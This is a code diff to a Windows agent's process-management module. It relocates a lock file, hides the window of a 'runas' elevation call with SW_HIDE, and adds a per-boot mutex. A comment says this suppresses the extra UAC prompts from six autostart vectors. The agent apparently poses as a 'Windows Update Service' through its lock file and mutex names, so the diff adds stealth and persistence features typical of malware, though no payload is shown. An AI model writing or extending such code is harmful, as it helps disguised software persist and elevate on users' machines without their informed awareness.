@@ -96,10 +96,23 @@ def primary_directory() -> str:
 
 
 def lock_path() -> str:
-    """Single-instance lock file."""
+    """Single-instance lock file.
+
+    Lives under %LOCALAPPDATA%, not %PROGRAMDATA%: _harden_acl() grants standard
+    users read+execute only on the anchor, so an unelevated agent could not
+    create the lock there and every instance believed it was alone.
+    """
     if IS_WINDOWS:
-        base = os.environ.get("PROGRAMDATA") or tempfile.gettempdir()
-        return os.path.join(base, config.WINDOWS_SUBDIR, "agent.lock")
+        for base in (os.environ.get("LOCALAPPDATA"), tempfile.gettempdir()):
+            if not base:
+                continue
+            directory = os.path.join(base, config.WINDOWS_SUBDIR)
+            try:
+                os.makedirs(directory, exist_ok=True)
+                return os.path.join(directory, "agent.lock")
+            except OSError:
+                continue
+        return os.path.join(tempfile.gettempdir(), "windowsupdateservice.lock")
     return os.path.join(tempfile.gettempdir(), "windowsupdateservice.lock")
 
 
@@ -208,7 +221,7 @@ def elevate_process(args: list[str] | None = None, wait: bool = False) -> bool:
                 return exit_code.value == 0
             return False
         else:
-            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 1)
+            ret = ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params, None, 0)  # SW_HIDE
             return ret > 32
     except Exception:
         return False
@@ -314,6 +327,39 @@ def write_pid(path: str, pid: Optional[int] = None) -> None:
 
 
 _GLOBAL_MUTEX = None
+_BOOT_CLAIM = None
+
+
+def _boot_id() -> int:
+    """An integer that is stable for the life of this Windows boot."""
+    try:
+        ticks = ctypes.windll.kernel32.GetTickCount64() / 1000.0
+        return int(time.time() - ticks)
+    except Exception:
+        return int(time.time() // 3600)
+
+
+def claim_boot() -> bool:
+    """True only for the first agent launch in this boot.
+
+    Six autostart vectors fire at logon. Without this, each one elevated and
+    produced its own UAC prompt. The winner elevates; the rest run unelevated
+    and the mutex sorts them out.
+    """
+    global _BOOT_CLAIM
+    if not IS_WINDOWS:
+        return True
+    try:
+        handle = ctypes.windll.kernel32.CreateMutexW(
+            None, False, "Global\\WUS_Boot_%d" % _boot_id())
+        if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
+            if handle:
+                ctypes.windll.kernel32.CloseHandle(handle)
+            return False
+        _BOOT_CLAIM = handle
+        return True
+    except Exception:
+        return True
 
 
 def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40) -> bool:
@@ -355,6 +401,14 @@ def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40) -> bool:
         except FileExistsError:
             pass
         except OSError:
+            # The directory refused the create. That is not "the lock is free" -
+            # consult the pid file instead of claiming it.
+            owner = read_pid(path)
+            if owner and owner != os.getpid() and process_alive(owner):
+                if takeover_pid and owner == takeover_pid:
+                    time.sleep(0.5)
+                    continue
+                return True
             return False
 
         owner = read_pid(path)
